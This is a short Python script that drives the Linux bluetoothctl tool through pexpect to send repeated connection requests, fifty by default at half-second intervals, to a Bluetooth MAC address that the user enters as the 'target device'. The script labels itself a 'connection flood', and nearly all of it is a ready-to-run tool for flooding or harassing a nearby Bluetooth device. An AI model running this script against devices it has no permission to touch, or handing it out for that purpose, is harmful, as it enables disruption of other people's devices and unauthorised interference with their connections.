import pexpect
import time
import sys

def flood_connect(mac, attempts=50, delay=0.5):
    print(f"---   Starting connection flood to {mac}   ---")

    flood = pexpect.spawn("bluetoothctl", encoding='utf-8', timeout=5)
    flood.expect("#")
    flood.sendline("power on")
    flood.expect("#")
    flood.sendline("agent on")
    flood.expect("#")
    flood.sendline("default-agent")
    flood.expect("#")

    for i in range(attempts):

        print(f"[{i+1}] Attempting to connect -")
        flood.sendline(f"connect {mac}")
        try:
            flood.expect(["Connection successful", "Failed to connect", "Device already connected", "AuthenticationFailed", "#"], timeout=3)
            print(f'Before - {flood.before.strip()}')
            print(f'After - {flood.after.strip()}')
            
        except Exception as e:
            print(f"Attempt {i+1} failed: {e}")

        time.sleep(delay) 

    flood.sendline("exit")
    flood.close()
    print("\n---   Flood complete.   ---")

if __name__ == "__main__":
    mac = input("Enter the MAC address of the target device: ")
    flood_connect(mac)